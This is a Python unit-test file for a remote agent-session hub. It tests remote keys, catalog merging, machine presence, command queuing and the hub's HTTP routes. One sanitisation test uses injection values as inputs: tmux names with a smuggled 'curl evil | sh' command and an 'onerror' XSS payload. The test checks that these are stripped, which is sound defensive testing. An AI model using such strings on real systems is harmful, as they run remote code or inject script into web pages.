"""R3: satellite agent, remote keys, machine registry, command queue."""

import http.client
import json
import os
import shutil
import socket
import struct
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

from swe.remote import agent as agent_mod
from swe.remote import usage as usage_mod
from swe.remote import attachments, catalog as catalog_mod
from swe.remote import inject, journal, pairing, protocol, supervise
from swe.remote import hub
from swe.remote.hub import HubState, make_server
from swe.sessions.models import Session

from tests._tempdir import temp_dir


def _session(sid="s1", tool="claude", path="/tmp/proj"):
    return Session(timestamp=0, agent="Claude Code", path=path,
                   title="test", session_id=sid, tool_name=tool)


class _Hub:
    """A real hub on localhost; satellites are plain HTTP clients."""

    def __init__(self, sessions=None):
        self.home = Path(tempfile.mkdtemp())
        self.state = HubState(self.home)
        self.state.catalog._fetch = lambda: list(sessions or [])
        self.state.catalog._status_of = lambda ss: ["active"] * len(ss)
        self.state.catalog.refresh()
        self.server = make_server(self.state, "127.0.0.1", 0)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(
            target=self.server.serve_forever, kwargs={"poll_interval": 0.02},
            daemon=True
        )
        self.thread.start()
        self.base = f"http://127.0.0.1:{self.port}"
        cred = self._pair()
        self.auth = {"Authorization": f"Bearer {cred['credential']}"}

    def _pair(self, role=""):
        token = pairing.mint_pair_token(self.home)
        body = {"token": token, "name": "dev"}
        if role:
            body["role"] = role
        status, data = self.request("POST", "/v1/pair", body)
        assert status == 200, data
        return json.loads(data)

    def satellite(self, mid):
        """Pair a satellite credential and bind it to ``mid`` via
        /v1/agent/register; returns its Authorization headers."""
        cred = self._pair(role="satellite")
        auth = {"Authorization": f"Bearer {cred['credential']}"}
        status, data = self.request(
            "POST", "/v1/agent/register", {"machine": {"id": mid}},
            headers=auth)
        assert status == 200, data
        return auth

    def stop(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=3)
        # The hub's home is a mkdtemp folder, so it is the hub's to remove.
        shutil.rmtree(self.home, ignore_errors=True)

    def request(self, method, path, body=None, headers=None):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=5)
        try:
            conn.request(
                method, path,
                body=json.dumps(body) if body is not None else None,
                headers=headers or {},
            )
            resp = conn.getresponse()
            data = resp.read()
            return resp.status, data
        finally:
            conn.close()


class TestRemoteKeys(unittest.TestCase):
    def test_round_trip(self):
        key = protocol.remote_key("m1", "claude:abc")
        self.assertEqual(key, "claude:abc@m1")
        local, mid = protocol.split_remote_key(key)
        self.assertEqual((local, mid), ("claude:abc", "m1"))

    def test_local_key_has_no_machine(self):
        local, mid = protocol.split_remote_key("claude:abc")
        self.assertEqual((local, mid), ("claude:abc", None))

    def test_trailing_at_is_local(self):
        local, mid = protocol.split_remote_key("claude:abc@")
        self.assertEqual((local, mid), ("claude:abc@", None))

    def test_command_envelope(self):
        cmd = protocol.command("message", "claude:a", "m1", "c7",
                               {"text": "hi"})
        self.assertEqual(cmd["type"], "command")
        self.assertEqual(cmd["session"], "claude:a")
        self.assertEqual(cmd["data"]["op"], "message")
        self.assertEqual(cmd["data"]["command_id"], "c7")
        self.assertEqual(cmd["data"]["text"], "hi")


class TestRemoteCatalog(unittest.TestCase):
    def setUp(self):
        self.home = temp_dir(self)

    def test_merge_stamps_and_persists(self):
        rows = [{"key": "claude:a", "title": "t", "ownership": "observed"}]
        out = catalog_mod.merge_remote_rows(self.home, "m1", rows)
        self.assertEqual(out[0]["key"], "claude:a@m1")
        self.assertTrue(out[0]["remote"])
        self.assertEqual(out[0]["machine_id"], "m1")
        loaded = catalog_mod.load_remote_rows(self.home)
        self.assertEqual([r["key"] for r in loaded], ["claude:a@m1"])

    def test_merge_keeps_only_pane_names_supervise_makes(self):
        """A satellite's tmux name lands in web markup and a pasted shell
        line, so anything but ``swe-<hex>`` (or a pre-rename satellite's
        ``qv-<hex>``) is dropped from the row."""
        good = supervise.tmux_name("claude:a")
        old = supervise.legacy_tmux_name("claude:f")
        rows = [
            {"key": "claude:a", "tmux": good},
            {"key": "claude:f", "tmux": old},
            {"key": "claude:g", "tmux": "swe-1; curl evil | sh"},
            {"key": "claude:b", "tmux": '<img src=x onerror="alert(1)">'},
            {"key": "claude:c", "tmux": "qv-1; curl evil | sh"},
            {"key": "claude:d", "tmux": None},
            {"key": "claude:e"},
        ]
        out = {r["key"]: r for r in
               catalog_mod.merge_remote_rows(self.home, "m1", rows)}
        self.assertEqual(out["claude:a@m1"]["tmux"], good)
        self.assertTrue(good.startswith("swe-"))
        self.assertEqual(out["claude:f@m1"]["tmux"], old)
        for key in ("claude:b@m1", "claude:c@m1", "claude:d@m1",
                    "claude:e@m1", "claude:g@m1"):
            self.assertNotIn("tmux", out[key], key)

    def test_refresh_includes_remote_rows_not_tailed(self):
        cat = catalog_mod.Catalog(self.home, "localmid",
                                  fetch_sessions=lambda: [],
                                  status_of=lambda ss: [])
        catalog_mod.merge_remote_rows(
            self.home, "m1",
            [{"key": "claude:a", "title": "remote one"}],
        )
        rows = cat.refresh()
        self.assertIn("claude:a@m1", [r["key"] for r in rows])
        self.assertEqual(cat.tail_rows(), [])
        self.assertIsNone(cat.session_for("claude:a@m1"))
        self.assertIsNotNone(cat.row_for("claude:a@m1"))

    def test_note_status_patches_row_and_survives_a_stale_refresh(self):
        sess = Session(timestamp=0, agent="Claude Code", path="/p",
                       session_id="s1", tool_name="claude")
        verdict = {"status": "done", "during": None}

        def status_of(sessions):
            if verdict["during"]:
                verdict["during"]()
            return [verdict["status"]] * len(sessions)

        cat = catalog_mod.Catalog(self.home, "localmid",
                                  fetch_sessions=lambda: [sess],
                                  status_of=status_of)
        cat.refresh()
        key = cat.rows()[0]["key"]
        rows, as_of = cat.tail_snapshot()
        self.assertEqual(rows[0][2], "done")
        self.assertGreater(as_of, 0)
        # A probe older than the catalog's read is ignored.
        cat.note_status(key, "active", as_of - 1)
        self.assertEqual(cat.row_for(key)["status"], "done")
        # A newer one patches the row and the tail rows at once.
        cat.note_status(key, "active", time.time())
        self.assertEqual(cat.row_for(key)["status"], "active")
        self.assertEqual(cat.tail_rows()[0][2], "active")
        # A refresh whose read began before a probe keeps the probe's.
        # (+1 s: a probe in the same microsecond as the read is a tie.)
        verdict["during"] = lambda: cat.note_status(
            key, "active", time.time() + 1)
        cat.refresh()
        self.assertEqual(cat.row_for(key)["status"], "active")
        # One that began after it takes its own read.
        verdict["during"] = None
        with patch.object(catalog_mod.time, "time",
                          return_value=time.time() + 60):  # after it
            cat.refresh()
        self.assertEqual(cat.row_for(key)["status"], "done")
        self.assertEqual(cat._fresh, {})

    def test_agent_tail_manager_probes_and_reports_to_catalog(self):
        ag = agent_mod.RemoteAgent("http://h:1", "c", self.home)
        self.assertIsNotNone(ag.tail_manager._status_of)
        self.assertEqual(ag.tail_manager._on_status, ag._on_probed_status)

    def test_machine_upsert_round_trip(self):
        catalog_mod.upsert_machine(
            self.home, {"id": "m1", "name": "mbp", "online": True})
        catalog_mod.upsert_machine(
            self.home, {"id": "m1", "online": False})
        row = catalog_mod.load_machines(self.home)["m1"]
        self.assertEqual(row["name"], "mbp")
        self.assertFalse(row["online"])

    def test_detected_harnesses(self):
        with patch("swe.remote.catalog.shutil.which",
                   side_effect=lambda b: "/bin/x" if b == "claude" else None):
            with patch(
                "swe.sessions.resume.launch_tool",
                side_effect=lambda t: {"claude": "claude"}.get(t, t),
            ):
                found = catalog_mod.detected_harnesses()
        self.assertIn("claude", found)
        self.assertNotIn("opencode", found)

    def test_local_machine_offers_only_launchable(self):
        with patch.object(catalog_mod, "detected_harnesses",
                          return_value=["claude", "gemini", "opencode"]), \
             patch.object(catalog_mod, "launchable_harnesses", return_value=[
                 {"name": "opencode", "command": "opencode",
                  "display_name": "OpenCode", "tracked": True,
                  "launch_model": False, "launch_effort": False,
                  "launch_yolo": False},
                 {"name": "qwen-code", "command": "qwen",
                  "display_name": "Qwen Code", "tracked": False,
                  "launch_model": True, "launch_effort": False,
                  "launch_yolo": True}]):
            row = catalog_mod.local_machine(self.home)
        self.assertEqual(row["harnesses"], ["claude", "gemini", "opencode"])
        self.assertEqual(row["launchable"], ["opencode", "qwen-code"])
        self.assertEqual(row["harness_names"]["opencode"], "OpenCode")
        self.assertEqual(row["untracked_harnesses"], ["qwen-code"])
        # Picker hints ride the machine row: launch-capable ops per
        # harness, and the ledger's last-used model per harness.
        self.assertEqual(row["model_at_launch"], ["qwen-code"])
        self.assertEqual(row["effort_at_launch"], [])
        self.assertEqual(row["yolo_at_launch"], ["qwen-code"])
        self.assertEqual(row["last_models"], {})
        self.assertEqual(row["recent_models"], {})

    def test_last_used_models_reads_the_ledger(self):
        from swe.ledger.models import LedgerRecord, UsageEvent
        from swe.ledger.store import LedgerStore, ledger_path_for

        def rec(key, harness, model, ts):
            return LedgerRecord(
                key=key,
                event=UsageEvent(
                    harness=harness, account="", session="s", cwd="",
                    model=model, ts=ts, input=1, output=1))

        store = LedgerStore(ledger_path_for(self.home))
        store.upsert(rec("a", "claude", "sonnet", 10))
        store.upsert(rec("b", "claude", "opus", 20))   # newer wins
        store.upsert(rec("c", "codex", "gpt-5", 15))
        store.upsert(rec("d", "claude", "", 30))       # empty is no pick
        store.db.commit()  # writers commit; upsert only stages
        store.close()
        self.assertEqual(catalog_mod.last_used_models(self.home),
                         {"claude": "opus", "codex": "gpt-5"})
        self.assertEqual(catalog_mod.last_used_models(
            temp_dir(self)), {})

    def test_app_prefs_follow_the_current_home(self):
        # Bound to Path.home() at import, the path ignored a HOME set
        # later (a test home, a hub started for another user's home).
        import plistlib
        home = temp_dir(self)
        prefs = home / catalog_mod._APP_PREFS_REL
        prefs.parent.mkdir(parents=True)
        prefs.write_bytes(plistlib.dumps({"providerOrder": ["codex"]}))
        with patch.dict(os.environ, {"HOME": str(home)}):
            order, _off = catalog_mod._provider_visibility()
        self.assertEqual(order, ["codex"])

    def _launchable(self, reg, prefs=None, on_path=None):
        import plistlib
        prefs_path = temp_dir(self) / "prefs.plist"
        if prefs is not None:
            prefs_path.write_bytes(plistlib.dumps(prefs))
        on_path = set(reg) if on_path is None else on_path
        with patch("swe.harness.registry.load_registry_readonly",
                   return_value=reg), \
             patch.object(catalog_mod, "APP_PREFS", prefs_path), \
             patch.object(catalog_mod.shutil, "which",
                          side_effect=lambda c: f"/bin/{c}" if c in on_path
                          else None), \
             patch.object(catalog_mod, "_session_parsers",
                          return_value={"claude": None, "cursor": None,
                                        "kilo": None, "pi": None,
                                        "codex": None}):
            return catalog_mod.launchable_harnesses()

    def test_launchable_follows_registry_and_visibility(self):
        reg = {
            "claude": {"command": "claude", "display_name": "Claude Code"},
            "cursor": {"command": "cursor-agent", "state": "starred"},
            "droid": {"command": "droid", "state": "archived"},
            "kilo": {"command": "kilo"},
            "qwen-code": {"command": "qwen"},
        }
        items = self._launchable(
            reg,
            prefs={"providerOrder": ["qwen-code", "kilo", "cursor", "claude"],
                   "providerDisabled": ["kilo"]},
            on_path={"claude", "cursor-agent", "droid", "kilo", "qwen"})
        self.assertEqual([i["name"] for i in items],
                         ["qwen-code", "cursor", "claude"])
        self.assertEqual(items[1]["command"], "cursor-agent")
        self.assertEqual(items[2]["display_name"], "Claude Code")
        # No session parser for qwen: offered, but flagged untracked.
        self.assertEqual([i["tracked"] for i in items], [False, True, True])

    def test_known_session_ids_adds_the_parsers_fresh_view(self):
        proj = str(temp_dir(self))
        def sess(sid, path=proj, tool="opencode"):
            return Session(timestamp=0, agent="x", path=path,
                           session_id=sid, tool_name=tool)
        rows = [("k1", sess("cached"), "done"),
                ("k2", sess("elsewhere", path="/other"), "done")]
        with patch.object(catalog_mod, "_session_parsers", return_value={
                "opencode": lambda: [sess("fresh"), sess("cached"),
                                     sess("x", tool="claude")]}):
            self.assertEqual(
                catalog_mod.known_session_ids(rows, "opencode", proj),
                ["cached", "fresh"])
        with patch.object(catalog_mod, "_session_parsers", return_value={}):
            self.assertEqual(
                catalog_mod.known_session_ids(rows, "qwen-code", proj), [])

    def test_launchable_without_the_mac_app_keeps_registry_order(self):
        reg = {"pi": {"command": "pi"}, "codex": {"command": "codex"},
               "devin": {"command": "devin"}}
        items = self._launchable(reg, on_path={"pi", "codex"})
        self.assertEqual([i["name"] for i in items], ["pi", "codex"])
        with patch.object(catalog_mod, "launchable_harnesses",
                          return_value=items):
            self.assertEqual(catalog_mod.launch_command("codex"), "codex")
            self.assertIsNone(catalog_mod.launch_command("devin"))


class TestPresence(unittest.TestCase):
    def setUp(self):
        self.home = temp_dir(self)
        self.state = HubState(self.home)

    def test_connect_disconnect_events(self):
        self.state.sat_connected("m1")
        self.assertTrue(self.state.machine_online("m1"))
        row = catalog_mod.load_machines(self.home)["m1"]
        self.assertTrue(row["online"])
        events, _ = self.state.journal.read_since("_global", 0)
        types = [e["type"] for e in events]
        self.assertIn("machine.online", types)

        self.state.sat_disconnected("m1")
        self.assertFalse(self.state.machine_online("m1"))
        row = catalog_mod.load_machines(self.home)["m1"]
        self.assertFalse(row["online"])
        events, _ = self.state.journal.read_since("_global", 0)
        self.assertIn("machine.offline", [e["type"] for e in events])

    def test_double_connect_needs_double_disconnect(self):
        self.state.sat_connected("m1")
        self.state.sat_connected("m1")
        self.state.sat_disconnected("m1")
        self.assertTrue(self.state.machine_online("m1"))
        self.state.sat_disconnected("m1")
        self.assertFalse(self.state.machine_online("m1"))

    def test_hub_itself_always_online(self):
        self.assertTrue(self.state.machine_online(self.state.machine_id))


class TestCommandQueue(unittest.TestCase):
    def setUp(self):
        self.home = temp_dir(self)
        self.state = HubState(self.home)

    def test_queue_journals_and_replays(self):
        cmd = self.state.queue_command(
            "m1", "message", "claude:a@m1", {"text": "hi", "mode": "queue"})
        self.assertEqual(cmd["type"], "command")
        self.assertEqual(cmd["session"], "claude:a")  # local key only
        self.assertTrue(cmd["data"]["command_id"])

        replay, truncated = self.state.journal.read_since(
            "_sat_m1", 0)
        self.assertFalse(truncated)
        self.assertEqual(len(replay), 1)
        self.assertEqual(replay[0]["data"]["text"], "hi")

    def test_queued_event_on_session_journal(self):
        self.state.queue_command(
            "m1", "control", "claude:a@m1", {"ctl": "interrupt"})
        events, _ = self.state.journal.read_since("claude:a@m1", 0)
        self.assertEqual(events[0]["type"], "command.queued")
        self.assertEqual(events[0]["data"]["op"], "control")

    def test_live_publish_to_subscriber(self):
        q = self.state.bus.subscribe("_sat_m1")
        self.state.queue_command("m1", "control", "", {"ctl": "x"})
        ev = q.get(timeout=2)
        self.assertEqual(ev["type"], "command")
        self.assertEqual(ev["data"]["ctl"], "x")

    def test_offline_replay_only_after_last(self):
        self.state.queue_command("m1", "control", "", {"ctl": "a"})
        self.state.queue_command("m1", "control", "", {"ctl": "b"})
        replay, _ = self.state.journal.read_since("_sat_m1", 1)
        self.assertEqual(len(replay), 1)
        self.assertEqual(replay[0]["data"]["ctl"], "b")


class TestAgentState(unittest.TestCase):
    def setUp(self):
        self.home = temp_dir(self)

    def _agent(self):
        return agent_mod.RemoteAgent("http://hub", "cred", home=self.home)

    def test_agent_file_round_trip(self):
        conf = {"hub": "http://x", "credential": "c", "device_id": "d"}
        agent_mod.save_agent(self.home, conf)
        self.assertEqual(agent_mod.load_agent(self.home), conf)
        mode = agent_mod.agent_file_for(self.home).stat().st_mode & 0o777
        self.assertEqual(mode, 0o600)

    def test_cursor_persists(self):
        a = self._agent()
        a._done_cmd_seq = 42
        a._save_cmd_cursor()
        b = self._agent()
        self.assertEqual(b._done_cmd_seq, 42)
        self.assertEqual(b._last_cmd_seq, 42)

    def test_cursor_scoped_to_hub(self):
        a = self._agent()
        a._done_cmd_seq = 42
        a._save_cmd_cursor()
        # A re-paired hub must not skip its own command queue.
        other = agent_mod.RemoteAgent("http://other:9", "c", self.home)
        self.assertEqual(other._done_cmd_seq, 0)

    def test_handle_frame_skips_replay_overlap(self):
        a = self._agent()
        a._dispatch = MagicMock()
        a._handle_frame(json.dumps({
            "type": "command", "seq": 3,
            "data": {"op": "control", "command_id": "c1"},
        }).encode())
        a._handle_frame(json.dumps({
            "type": "command", "seq": 2,
            "data": {"op": "control", "command_id": "c2"},
        }).encode())
        self.assertEqual(a._dispatch.call_count, 1)
        self.assertEqual(a._last_cmd_seq, 3)

    def test_dispatch_reports_command_result(self):
        a = self._agent()
        a._execute = MagicMock(return_value=(True, "sent", False))
        a._dispatch({
            "type": "command", "session": "claude:a",
            "data": {"op": "message", "command_id": "c9"},
        })
        self.assertEqual(len(a.outbox), 1)
        ev = a.outbox[0]
        self.assertEqual(ev["type"], "command.result")
        self.assertEqual(ev["session"], "claude:a")
        self.assertEqual(ev["data"]["command_id"], "c9")
        self.assertTrue(ev["data"]["ok"])

    def test_dispatch_echoes_request_id(self):
        a = self._agent()
        a._execute = MagicMock(return_value=(True, "answered", False))
        a._dispatch({
            "type": "command", "session": "claude:a",
            "data": {"op": "approval", "command_id": "c2",
                     "request_id": "req-77"},
        })
        ev = a.outbox[0]
        self.assertEqual(ev["type"], "command.result")
        self.assertEqual(ev["data"]["request_id"], "req-77")
        self.assertFalse(ev["data"]["degraded"])

    def test_dispatch_echoes_client_id(self):
        a = self._agent()
        a._execute = MagicMock(return_value=(True, "sent", False))
        a._dispatch({
            "type": "command", "session": "claude:a",
            "data": {"op": "message", "command_id": "c3",
                     "client_id": "cid-9"},
        })
        ev = a.outbox[0]
        self.assertEqual(ev["type"], "command.result")
        self.assertEqual(ev["data"]["client_id"], "cid-9")

    def test_execute_message_uses_injector(self):
        a = self._agent()
        sess = _session()
        a.catalog.session_for = MagicMock(return_value=sess)
        fake = MagicMock()
        fake.send.return_value = inject.InjectResult(True, "ok")
        with patch.object(inject, "injector_for", return_value=fake), \
             patch.object(supervise, "meta_for", return_value={}):
            ok, note, _deg = a._execute(
                "claude:s1", "message",
                {"text": "hello", "mode": "steer", "status": "active"})
        self.assertTrue(ok)
        args = fake.send.call_args[0]
        self.assertEqual(args[1]["text"], "hello")
        self.assertEqual(args[1]["mode"], "steer")

    def test_execute_wakes_the_local_tailer(self):
        a = self._agent()
        a.catalog.session_for = MagicMock(return_value=_session())
        fake = MagicMock()
        fake.send.return_value = inject.InjectResult(True, "ok")
        fake.approval.return_value = inject.InjectResult(True, "ok")
        with patch.object(inject, "injector_for", return_value=fake), \
             patch.object(supervise, "meta_for", return_value={}):
            a._execute("claude:s1", "message", {"text": "hi"})
            a._execute("claude:s2", "approval",
                       {"request_id": "r", "decision": "allow"})
        with patch.object(supervise, "attach",
                          return_value=(True, "attached")):
            a._execute("claude:s3", "attach", {"mode": "tmux"})
        with patch.object(supervise, "attach",
                          return_value=(False, "busy")):
            a._execute("claude:s4", "attach", {"mode": "tmux"})
        for key in ("claude:s1", "claude:s2", "claude:s3"):
            self.assertTrue(a.tail_manager.is_hot(key), key)
        self.assertFalse(a.tail_manager.is_hot("claude:s4"))

    def test_execute_attach_calls_supervise(self):
        a = self._agent()
        a.catalog.session_for = MagicMock(return_value=_session())
        with patch.object(
            supervise, "attach", return_value=(True, "attached")
        ) as att:
            ok, _, _deg = a._execute("claude:s1", "attach",
                               {"mode": "tmux", "status": "idle",
                                "model": "opus", "effort": "high"})
        self.assertTrue(ok)
        self.assertEqual(att.call_args[1]["mode"], "tmux")
        self.assertEqual(att.call_args[1]["model"], "opus")
        self.assertEqual(att.call_args[1]["effort"], "high")

    def test_execute_unknown_session(self):
        a = self._agent()
        a.catalog.session_for = MagicMock(return_value=None)
        ok, note, _deg = a._execute("claude:ghost", "message", {"text": "x"})
        self.assertFalse(ok)
        self.assertIn("unknown session", note)

    def test_execute_unknown_op(self):
        a = self._agent()
        a.catalog.session_for = MagicMock(return_value=_session())
        with patch.object(supervise, "meta_for", return_value={}):
            ok, note, _deg = a._execute("claude:s1", "nonsense", {})
        self.assertFalse(ok)
        self.assertIn("unknown op", note)

    def test_execute_attachment_pulls_hub_key(self):
        a = self._agent()
        staged = []

        def fake_stage(home, key, name, data):
            staged.append((key, name, data))
            return {"ref": name}, None

        with patch.object(agent_mod, "_get_bytes",
                          return_value=b"PNG") as get, \
             patch.object(attachments, "place", side_effect=fake_stage):
            ok, note, _deg = a._execute(
                "claude:s1", "attachment",
                {"ref": "1-shot.png", "hub_key": "claude:s1@m1"})
        self.assertTrue(ok)
        url = get.call_args[0][1]
        self.assertIn("claude%3As1%40m1/1-shot.png", url)
        self.assertEqual(staged[0][1], "1-shot.png")

    def test_attachment_pull_quotes_a_key_with_slashes(self):
        # A session id can be a path: unquoted, its "/" split the route
        # at the wrong place and "#" ended the URL early.
        a = self._agent()
        with patch.object(agent_mod, "_get_bytes", return_value=None) as get:
            a._execute("droid:/a/b#c", "attachment",
                       {"ref": "1 shot.png", "hub_key": "droid:/a/b#c@m1"})
        url = get.call_args[0][1]
        self.assertEqual(
            url, "/v1/agent/attachments/droid%3A%2Fa%2Fb%23c%40m1/1%20shot.png")


class _AgentHub(_Hub):
    """Hub + a satellite credential bound to sat-m1 (no RemoteAgent).

    ``self.auth`` is a plain phone credential for the session routes;
    ``self.sat_auth`` is the satellite's for ``/v1/agent/*``.
    """

    def __init__(self, sessions=None):
        super().__init__(sessions)
        self.sat_auth = self.satellite("sat-m1")


class TestAgentRoutes(unittest.TestCase):
    def setUp(self):
        self.srv = _AgentHub()
        self.addCleanup(self.srv.stop)
        self.mid = "sat-m1"

    def _push_catalog(self, rows):
        return self.srv.request(
            "POST", "/v1/agent/catalog",
            {"machine_id": self.mid, "rows": rows},
            headers=self.srv.sat_auth)

    def test_register_machine(self):
        status, data = self.srv.request(
            "POST", "/v1/agent/register",
            {"machine": {"id": self.mid, "name": "mbp", "os": "macos"}},
            headers=self.srv.sat_auth)
        self.assertEqual(status, 200)
        row = catalog_mod.load_machines(self.srv.home)[self.mid]
        self.assertEqual(row["name"], "mbp")

    def test_register_requires_id(self):
        status, _ = self.srv.request(
            "POST", "/v1/agent/register", {"machine": {}},
            headers=self.srv.sat_auth)
        self.assertEqual(status, 422)

    def test_catalog_push_merges_rows(self):
        status, _ = self._push_catalog([
            {"key": "claude:r1", "title": "remote", "status": "active",
             "ownership": "observed"},
        ])
        self.assertEqual(status, 200)
        _, data = self.srv.request(
            "GET", "/v1/sessions", headers=self.srv.auth)
        keys = [r["key"] for r in json.loads(data)["sessions"]]
        self.assertIn("claude:r1@sat-m1", keys)

    def test_catalog_push_emits_ownership_change(self):
        self._push_catalog([{"key": "claude:r1", "ownership": "observed"}])
        self._push_catalog([{"key": "claude:r1", "ownership": "attached"}])
        events, _ = self.srv.state.journal.read_since(
            "claude:r1@sat-m1", 0)
        own = [e for e in events if e["type"] == "session.ownership"]
        self.assertEqual(own[-1]["data"]["ownership"], "attached")

    def test_events_uplink_rekeys_session(self):
        status, _ = self.srv.request(
            "POST", "/v1/agent/events",
            {"machine_id": self.mid, "events": [
                protocol.event(
                    "message.appended", "claude:r1", self.mid,
                    protocol.message("user", "hi from satellite")),
            ]},
            headers=self.srv.sat_auth)
        self.assertEqual(status, 200)
        events, _ = self.srv.state.journal.read_since(
            "claude:r1@sat-m1", 0)
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0]["session"], "claude:r1@sat-m1")
        self.assertEqual(events[0]["machine"], self.mid)
        self.assertEqual(events[0]["data"]["text"], "hi from satellite")

    def test_events_uplink_still_takes_legacy_compaction(self):
        # compaction left protocol.EVENT_TYPES (nothing emits it), but
        # the hub keeps accepting it from an older satellite.
        self.assertNotIn("compaction", protocol.EVENT_TYPES)
        status, _ = self.srv.request(
            "POST", "/v1/agent/events",
            {"machine_id": self.mid, "events": [
                protocol.event("compaction", "claude:r1", self.mid, {}),
            ]},
            headers=self.srv.sat_auth)
        self.assertEqual(status, 200)
        events, _ = self.srv.state.journal.read_since(
            "claude:r1@sat-m1", 0)
        self.assertEqual([e["type"] for e in events], ["compaction"])

    def test_message_routes_to_command_journal(self):
        self._push_catalog([{
            "key": "claude:r1", "title": "r", "status": "idle",
            "ownership": "attached", "machine_id": self.mid,
        }])
        self.srv.state.catalog.refresh()
        status, data = self.srv.request(
            "POST", "/v1/sessions/claude%3Ar1%40sat-m1/message",
            {"text": "yo", "mode": "queue", "client_id": "cid-9"},
            headers=self.srv.auth)
        self.assertEqual(status, 202)
        body = json.loads(data)
        self.assertTrue(body["queued"])
        # Same shape as the local 202; waiting stays false (the
        # satellite waits itself; nothing parks in the hub's tray).
        self.assertEqual(body["client_id"], "cid-9")
        self.assertFalse(body["waiting"])
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        self.assertEqual(len(replay), 1)
        self.assertEqual(replay[0]["session"], "claude:r1")
        self.assertEqual(replay[0]["data"]["op"], "message")
        self.assertEqual(replay[0]["data"]["text"], "yo")
        self.assertEqual(replay[0]["data"]["client_id"], "cid-9")

    def test_observed_remote_rejects_message_allows_attach(self):
        # The machine row advertises the build that reads launch picks.
        catalog_mod.upsert_machine(self.srv.home, {
            "id": self.mid, "model_at_launch": ["claude"],
            "effort_at_launch": []})
        self._push_catalog([{
            "key": "claude:r1", "status": "idle",
            "ownership": "observed", "attachable": True,
        }])
        self.srv.state.catalog.refresh()
        key = "claude%3Ar1%40sat-m1"
        status, _ = self.srv.request(
            "POST", f"/v1/sessions/{key}/message",
            {"text": "x"}, headers=self.srv.auth)
        self.assertEqual(status, 409)
        status, _ = self.srv.request(
            "POST", f"/v1/sessions/{key}/control",
            {"op": "attach", "mode": "tmux", "model": "opus"},
            headers=self.srv.auth)
        self.assertEqual(status, 202)
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        self.assertEqual(replay[0]["data"]["op"], "attach")
        self.assertEqual(replay[0]["data"]["model"], "opus")
        # A malformed pick is a 422 on the hub, never queued.
        status, data = self.srv.request(
            "POST", f"/v1/sessions/{key}/control",
            {"op": "attach", "mode": "tmux", "model": "two words"},
            headers=self.srv.auth)
        self.assertEqual(status, 422, data)
        self.assertEqual(json.loads(data)["error"]["code"], "bad_command")
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        self.assertEqual(len(replay), 1)

    def test_attach_to_an_old_satellite_refuses_the_pick(self):
        # Same gate as a satellite launch: without the field the agent
        # would accept the attach and silently drop model/effort.
        self._push_catalog([{
            "key": "claude:r1", "status": "idle",
            "ownership": "observed", "attachable": True,
        }])
        self.srv.state.catalog.refresh()
        key = "claude%3Ar1%40sat-m1"
        status, data = self.srv.request(
            "POST", f"/v1/sessions/{key}/control",
            {"op": "attach", "mode": "tmux", "effort": "high"},
            headers=self.srv.auth)
        self.assertEqual(status, 409, data)
        body = json.loads(data)
        self.assertEqual(body["error"]["code"], "unsupported_launch_option")
        self.assertIn("too old", body["error"]["message"])
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        self.assertEqual(replay, [])
        # And with no pick the same old agent attaches as before.
        status, _ = self.srv.request(
            "POST", f"/v1/sessions/{key}/control",
            {"op": "attach", "mode": "tmux"}, headers=self.srv.auth)
        self.assertEqual(status, 202)

    def test_opening_a_satellite_chat_queues_one_tail_until_acked(self):
        # Each GET of events/messages used to queue another tail, so a
        # chat left open on an offline satellite filled its backlog.
        self._push_catalog([{"key": "claude:r1", "status": "idle",
                             "ownership": "observed"}])
        self.srv.state.catalog.refresh()
        key = "claude%3Ar1%40sat-m1"

        def tails():
            replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
            return [e for e in replay if e["data"]["op"] == "tail"]

        for _ in range(3):
            status, _ = self.srv.request(
                "GET", f"/v1/sessions/{key}/messages",
                headers=self.srv.auth)
            self.assertEqual(status, 200)
        self.assertEqual(len(tails()), 1)
        # Once the satellite acks it, the next open may ask again.
        self.srv.state._sat_result_acked(
            self.mid, tails()[0]["data"]["command_id"])
        self.srv.request("GET", f"/v1/sessions/{key}/messages",
                         headers=self.srv.auth)
        self.assertEqual(len(tails()), 2)

    def test_concurrent_opens_queue_a_single_tail(self):
        self._push_catalog([{"key": "claude:r2", "status": "idle",
                             "ownership": "observed"}])
        self.srv.state.catalog.refresh()
        real_queue = self.srv.state.queue_command
        gate = threading.Barrier(4)

        def slow_queue(*a, **k):
            # Widen the check-to-record window the race needs.
            time.sleep(0.05)
            return real_queue(*a, **k)

        self.srv.state.queue_command = slow_queue

        def open_():
            gate.wait()
            self.srv.state.queue_tail("sat-m1", "claude:r2@sat-m1", "idle")

        threads = [threading.Thread(target=open_) for _ in range(4)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        self.assertEqual(
            len([e for e in replay if e["data"]["op"] == "tail"]), 1)

    def test_queue_tail_backlog_full_records_nothing(self):
        # A refused queue (backlog full) must not mark a tail pending,
        # or the next open would never ask again.
        state = self.srv.state
        with patch.object(state, "queue_command", return_value=None):
            state.queue_tail("sat-m1", "claude:r3@sat-m1", "idle")
        self.assertNotIn(("sat-m1", "claude:r3@sat-m1"), state._sat_tail_cmds)

    def test_queue_tail_map_stays_bounded(self):
        state = self.srv.state
        state._sat_tail_cmds.update(
            {("sat-m1", f"k{i}"): "c0" for i in range(4097)})
        state.queue_tail("sat-m1", "claude:r4@sat-m1", "idle")
        self.assertEqual(list(state._sat_tail_cmds),
                         [("sat-m1", "claude:r4@sat-m1")])

    def test_launch_to_named_machine_queues(self):
        status, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "sat-m1", "harness": "claude",
             "cwd": "/tmp/x", "prompt": "go"},
            headers=self.srv.auth)
        self.assertEqual(status, 202)
        self.assertTrue(json.loads(data)["queued"])
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        self.assertEqual(replay[0]["data"]["op"], "launch")
        self.assertEqual(replay[0]["data"]["harness"], "claude")
        launch_id = json.loads(data)["launch_id"]
